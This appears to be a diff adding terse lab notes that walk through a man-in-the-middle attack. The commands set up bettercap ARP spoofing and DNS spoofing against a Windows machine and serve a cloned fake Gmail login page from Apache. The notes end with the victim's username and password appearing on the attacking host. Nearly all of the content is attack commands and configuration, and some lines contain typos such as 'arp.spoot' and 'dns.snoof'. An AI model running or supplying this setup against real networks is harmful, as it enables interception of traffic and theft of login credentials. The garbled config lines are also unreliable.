@@ -1,0 +1,33 @@
+DNS-ARP
+=======
+>sudo mkdir better
+>cd better 
+\\below all task perform on bettercap
+>sudo wget paste here bettercap zip from server
+>sudo apt-get install wget unzip libnetfilter-queue-dev libpcap-dev
+>unzip bettercap_linux
+>sudo ./bettercap --version
+>nano spoof.cap
+>edit init
+net.probe on
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.80.137 (windows ip)
+set arp.spoot on
+set net.sniff.local true
+net.sniff on
+set dns.snoof.all true
+set dns.spoof.domains cdac.in
+dns.spoof on
+-----
+open windows 10>cmd>ipconfig>
+open deb1
+>sudo ./bettercap -iface ens33 -caplet spoof.cap
+>yellow line showing
+>sudo apt-get install ca-certificates
+>sudo rm /var/www/html/*
+>sudo git clone https://github.com/Vamsheeth/Gmail-Login
+>sudo apt-get install git
+>sudo git clone https://github.com/Vamsheeth/Gmail-Login /var/www/html/
+>sudo systemctl restart apache2
+>sudo ./bettercap -iface ens33 -caplet spoof.cap
+>open window url >search deb1 ip>gmail page open>enter user password>open deb1>username and pasword showing
